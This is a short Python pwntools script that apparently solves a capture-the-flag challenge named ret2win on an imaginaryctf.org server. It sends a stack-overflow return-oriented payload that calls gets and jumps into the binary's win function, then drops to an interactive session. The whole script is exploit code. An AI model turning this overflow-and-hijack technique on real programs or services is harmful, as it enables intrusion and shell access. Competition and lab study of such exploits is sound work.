from pwn import *

context.binary = exe = ELF('./vuln')

#io = process()
#gdb.attach(io, api=True)

io = remote('ret2win.chal.imaginaryctf.org', 1337)

ret = 0x401198
mov_edi_0x404038 = 0x4010c7
add_al_ch_pop_rbp = 0x401190
add_eax_0x2efb = 0x401137

payload = b'i'*64 + p64(0x404040) + p64(exe.plt['gets']) + p64(ret) + p64(exe.sym['win']+15)

io.sendline(payload)
io.sendline(b'/bin0sh')
io.interactive()